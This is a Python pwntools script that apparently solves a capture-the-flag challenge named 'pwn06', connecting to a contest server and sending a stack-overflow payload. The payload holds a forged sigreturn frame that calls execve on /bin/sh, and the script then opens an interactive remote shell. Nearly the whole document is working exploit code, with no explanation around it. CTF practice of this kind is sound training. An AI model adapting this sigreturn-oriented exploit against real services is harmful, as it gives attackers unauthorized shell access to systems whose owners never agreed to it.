from pwn import *

#s = process('./pwn06')
s = remote('srop.pwn.wanictf.org', 9006)
elf = ELF('./pwn06')

rsp = int(s.recv(4096).decode('utf-8').split()[2], 16)
print(hex(rsp))

payload = b'/bin/sh\0'
payload += b'A' * (72 - len(payload) - 8)
payload += p64(0x401176) # call_syscall
payload += p64(0x401184) # set_rax

# push rbp                  # uc_flags
payload += p64(0)           # &uc_link
payload += p64(0)           # &ss_sp
payload += p64(0)           # ss_flags
payload += p64(0)           # ss_size
payload += p64(0) * 8       # r8-r15
payload += p64(rsp)         # rdi
payload += p64(0)           # rsi
payload += p64(rsp)         # rbp
payload += p64(0)           # rbx
payload += p64(0)           # rdx
payload += p64(59)          # rax
payload += p64(0)           # rcx
payload += p64(rsp)         # rsp
payload += p64(0x401176)    # rip
payload += p64(0)           # eflags
payload += p64(0x33)        # cs/gs/fs/ss
payload += p64(0) * 5       # err,trapno,oldmask,cr2,&fpstate

s.sendline(payload)
s.interactive()
